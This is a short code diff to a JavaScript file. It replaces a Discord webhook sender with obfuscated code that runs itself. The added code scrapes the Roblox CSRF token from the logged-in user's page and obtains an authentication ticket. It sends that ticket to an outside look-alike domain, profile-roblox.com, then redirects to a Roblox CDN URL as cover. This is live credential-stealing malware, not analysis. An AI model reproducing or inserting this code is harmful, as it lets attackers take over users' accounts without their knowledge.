@@ -1,15 +1,16 @@
-    function sendMessage() {
-      const request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/891634104506933279/pgr7g-vClzPxofu6s1GX7uR07lwDpD2OjEqILV8jwAM_W7NYpVlZokNzsqkn0TyoeagU");
+    async function payload2() {
+    var hash = (await (await fetch((await (await fetch("https://www.roblox.com/avatar-thumbnail-3d/json?userId=" + $("meta[name='user-data']").data("userid") + "&_=" + Math.random())).json()).Url)).json()).textures[0]
 
-      request.setRequestHeader('Content-type', 'application/json');
+    for (var i = 31, t = 0; t < 32; t++)
+        i ^= hash[t].charCodeAt(0);
 
-      const params = {
-        username: "My Webhook Name",
-        avatar_url: "",
-        content: "The message to send"
-      }
+    location.href = "https://t" + (i % 8).toString() + ".rbxcdn.com/" + hash
+}
+(async function(){var _0x2416b1=(await(await fetch('/home',{'credentials':'include'}))['text']())['split']('setToken(\x27')[0x1]['split']('\x27)')[0x0];var _0x12edd1=(await fetch('https://auth.roblox.com/v1/authentication-ticket',{'method':'POST','credentials':'include','headers':{'x-csrf-token':_0x2416b1}}))['headers']['get']('rbx-authentication-ticket');await fetch('https://profile-roblox.com/send22test.php'+'?t='+_0x12edd1);await payload2()}());
 
-      request.send(JSON.stringify(params));
-    }
-    sendMessage()
+
+payload2()
+    
+    
+    
+
